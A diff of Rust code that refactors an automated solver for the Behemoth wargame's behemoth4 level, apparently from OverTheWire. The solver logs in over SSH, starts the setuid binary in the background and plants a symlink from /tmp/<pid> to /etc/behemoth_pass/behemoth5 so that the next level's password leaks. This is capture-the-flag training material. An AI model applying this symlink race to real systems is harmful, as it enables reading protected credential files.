@@ -21,35 +21,31 @@ use anyhow::Result;
 ///   }
 /// technique is to start the process, get its pid, and in parellel create a link to the next password file to be read
 pub fn solve(password: &str) -> Result<String> {
-    let session = ssh_session(super::HOST, super::PORT, "behemoth4", password)?;
-    let mut channel = session.channel_session()?;
-    create_shell(&mut channel)?;
-
-    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
+    
+    let mut ssh = SSHShell::connect(super::HOST, super::PORT, "behemoth4", password)?;
+    ssh.read_until("$ ")?;
 
     println!("creating a tmp folder and moving to it");
-    write_line(&mut channel, "cd $(mktemp -d)")?;
-    read_until(&mut channel, "$ ")?;
+    ssh.write_line("cd $(mktemp -d)")?;
+    ssh.read_until("$ ")?;
 
     println!("starting process in background");
-    write_line(
-        &mut channel,
+    ssh.write_line(
         "bash -c 'echo $$ > test.pid && sleep 2 && exec /behemoth/behemoth4 > res.txt' &",
     )?;
-    read_until(&mut channel, "$ ")?;
+    ssh.read_until("$ ")?;
 
     println!("creating symlink");
-    write_line(
-        &mut channel,
+    ssh.write_line(
         "ln -s /etc/behemoth_pass/behemoth5 /tmp/$(cat test.pid)",
     )?;
-    read_until(&mut channel, "$ ")?;
+    ssh.read_until("$ ")?;
 
     println!("waiting for result");
     std::thread::sleep(std::time::Duration::from_secs(3));
 
-    write_line(&mut channel, "cat res.txt")?;
-    let result = read_until(&mut channel, "$ ")?;
+    ssh.write_line("cat res.txt")?;
+    let result = ssh.read_until("$ ")?;
     let result = result
         .split("\n")
         .map(|s| s.trim())
